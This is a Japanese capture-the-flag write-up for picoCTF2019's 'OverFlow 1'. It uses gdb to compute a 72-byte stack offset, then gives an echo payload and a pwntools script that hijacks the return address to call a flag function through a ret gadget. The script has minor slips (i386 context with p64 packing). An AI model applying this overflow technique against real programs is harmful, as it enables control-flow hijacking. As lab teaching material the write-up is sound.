# OverFlow 1
## picoCTF2019
## Binary Exploition
***

与えらえたソースコードを読む。  
基本的にはリターンアドレスを書き換えるだけの問題っぽいので、今まで通りBOFを起こしにかかる。ただし、なぜか今回pattcとpattoが使えなかったため、計算してオフセットを求める。  
基本的には、リターンアドレスが格納されるアドレスと、入力した値が格納されるアドレスが分かれば、その差分からオフセットが分かる。  
まずリターンアドレスを求める。今回、mainからvuln()が呼ばれる時にmainのアドレスがどこに積まれるかを調べる。gdbで実行し、vulnが呼ばれるまでnextし続ける。
> gdb ./vuln
> break main
> run
> next

すると、call 0x4007cc <vuln>という行に来る。ここで次にvuln関数の中に入りたいため、ステップイン実行を行う。
> step

この時、スタックのトップにmain関数のリターンアドレスが格納されているため、ここのスタックトップのアドレスを控えておく。
> 0xff....ddb8

次に入力した値がどこに格納されるのか調べるため、続けてnextし、入力待ち画面まで行く。
> next

入力待ち画面でとりあえずAAAAと打って、スタックのどこに保存されるか見てみると、0xff...dd70に保存されていた。  
ここからオフセットを求めると、0xff....ddb8 - 0xff....dd70となる。ddb8-dd70=48 10進数に直すと72となる。よってオフセットは72であることがわかる。  
ためしにgdbでもう一度入力画面まで進み、72文字の適当な文字列+BBBBとかを入力すると、RIPがBBBBとなり、RIPを奪うことに成功していることがわかる。  

次にflag関数のアドレスを調べる。
> p flag

ここからflag関数が0x400767にあることが分かる。  
ここまででflag関数のアドレスとオフセットが分かったため、攻撃可能になるため、一旦攻撃してみる。
> echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x67\x07\x40' | ./vuln

とするとflag関数が呼び出され、flagが呼び出されるはずだが、結果はSegmentation fault (core dumped)となる。  
これはx64の制約で、16byteで揃えていないと不正アクセスとみなされプログラムが終了してしまうためprintf関数でプログラムが終了したことによって起こっている。これを起こさないためには、flag関数の一番始めのpush命令を飛ばす(flag関数の2行目のアドレスをジャンプ先に指定する。)か、flag関数のリターンアドレスを使う方法がある。今回はリターンアドレスを使う。  

そのため、flag関数のリターンアドレスを調べるため、flag関数をディスアセンブリする。  
> disas flag

一番最後のret命令の部分のアドレスが0x4007cbになっている。これがリターンアドレスとなる。  

以上の条件から、攻撃コードは
> 72文字の文字列 + リターンアドレス + flag関数のアドレス

となる。これを元に攻撃コードを作成する。  

```
from pwn import *
context(arch="i386", os="linux")
p=process("./vuln")
e=ELF("./vuln")
flag_add=e.symbols[b'flag']
ret_add=0x4007cb
offset = 72
payload='a'*offset + p64(ret_add) + p64(flag_add)
p.sendline(payload)
p.interactive()
```

これを実行すると、flag.txtが読まれ、flagが表示される。